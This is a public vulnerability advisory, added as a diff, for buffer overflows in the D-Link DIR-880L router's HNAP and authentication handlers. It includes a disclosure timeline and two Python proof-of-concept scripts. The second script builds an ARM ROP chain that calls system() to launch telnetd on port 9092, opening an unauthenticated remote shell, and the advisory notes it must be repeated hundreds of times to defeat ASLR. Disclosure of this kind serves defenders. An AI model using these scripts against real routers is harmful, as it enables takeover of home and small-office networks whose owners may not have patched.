@@ -1,0 +1,73 @@
+## Advisory Information
+
+Title: DIR-880L Buffer overflows in authenticatio and HNAP functionalities. 
+Vendors contacted: William Brown <william.brown@dlink.com>, Patrick Cline patrick.cline@dlink.com(Dlink)
+CVE: None
+
+Note: All these security issues have been discussed with the vendor and vendor indicated that they have fixed issues as per the email communication. The vendor had also released the information on their security advisory pages http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10060, 
+http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10061
+
+However, the vendor has taken now the security advisory pages down and hence the information needs to be publicly accessible so that users using these devices can update the router firmwares. The author (Samuel Huntley) releasing this finding is not responsible for anyone using this information for malicious purposes. 
+
+## Product Description
+
+DIR-880L -- Wireless AC1900 Dual-Band Gigabit Cloud Router. Mainly used by home and small offices.
+
+## Vulnerabilities Summary
+
+Have come across 2 security issues in DIR-880 firmware which allows an attacker to exploit buffer overflows in authentication and  HNAP  functionalities. first 2 of the buffer overflows in auth and HNAP  can be exploited by an unauthentictaed attacker. The attacker can be on wireless LAN or WAN if mgmt interface is exposed to attack directly or using XSRF if not exposed. Also this exploit needs to be run atleast 200-500 times to bypass ASLR on ARM based devices. But it works as the buffer overflow happens in a seperate process than web server which does not allow web server to crash and hence attacker wins.
+
+## Details
+
+Buffer overflow in HNAP 
+----------------------------------------------------------------------------------------------------------------------
+import socket
+import struct
+
+#Currently the address of exit function in libraray used as $PC
+
+
+buf = "POST /HNAP1/ HTTP/1.0\r\nHOST: 192.168.1.8\r\nUser-Agent: test\r\nContent-Length: 1\r\nSOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings/XX" + "\x10\xd0\xff\x76"+"B"*220
+buf+= "\r\n" + "1\r\n\r\n"
+ 
+print "[+] sending buffer size", len(buf)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.0.0.90", 80))
+s.send(buf)
+
+----------------------------------------------------------------------------------------------------------------------
+
+
+Buffer overflow in auth
+----------------------------------------------------------------------------------------------------------------------
+import socket
+import struct
+
+
+buf = "GET /webfa_authentication.cgi?id="
+buf+="A"*408
+buf+="\x44\x77\xf9\x76" # Retn pointer (ROP1) which loads r0-r6 and pc with values from stack
+buf+="sh;#"+"CCCC"+"DDDD" #R0-R2
+buf+="\x70\x82\xFD\x76"+"FFFF"+"GGGG"      #R3 with system address and R4 and R5 with junk values
+buf+="HHHH"+"\xF8\xD0\xF9\x76" # R6 with crap and PC address loaded with ROP 2 address
+buf+="telnetd%20-p%209092;#" #actual payload which starts telnetd
+buf+="C"+"D"*25+"E"*25 + "A"*80 # 131 bytes of extra payload left
+buf+="&password=A HTTP/1.1\r\nHOST: 192.168.1.8\r\nUser-Agent: test\r\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nConnection:keep-alive\r\n\r\n"
+
+print "[+] sending buffer size", len(buf)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.0.0.90", 80))
+s.send(buf)
+
+----------------------------------------------------------------------------------------------------------------------
+
+
+## Report Timeline
+
+* April 26, 2015: Vulnerability found by Samuel Huntley and reported to William Brown and Patrick Cline.
+* July 17, 2015: Vulnerability was fixed by Dlink as per the email sent by the vendor
+* Nov 13, 2015: A public advisory is sent to security mailing lists.
+
+## Credit
+
+This vulnerability was found by Samuel Huntley
